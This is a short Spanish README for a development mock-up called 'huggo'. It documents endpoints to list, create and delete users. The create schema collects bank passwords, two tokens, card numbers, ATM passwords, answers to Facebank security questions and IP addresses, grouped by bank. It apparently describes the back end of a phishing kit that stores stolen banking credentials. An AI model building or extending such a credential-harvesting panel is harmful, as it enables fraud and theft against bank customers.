# Maqueta de desarrollo para huggo

## gestion de usuarios

    [User] getAll

Obtiene todos los usuarios

    [User] create
Le llega un parametro que preferiblemente debe tener el siguiente aspecto
```json
{
    "name": "String BANK",
    "username": "String",
    "password": "String",
    "correo": "String",
    "celular": "String",
    "token1": "String",
    "token2": "String",
    "tarjeta": "String",
    "atmPassword": "String",
    "faceBankAlias": "String",
    "facebankPreguntaPasatiempoFav": "String",
    "facebankPreguntaSitioVacacionesFav": "String",
    "facebankPreguntaModeloPrimerVehiculo": "String",
    "facebankPreguntaSegundoNombreDelPadre": "String",
    "facebankPreguntaComidaFav": "String",
    "ip": "String"
}
```

Elimina un solo usuario

    [User] delete
```json
    "id": "Mongo ID"
```

Eliminar todos los usuarios de un banco

    [User] deleteAll
```json
    "bank": "objeto name"
```

## Gestion de pages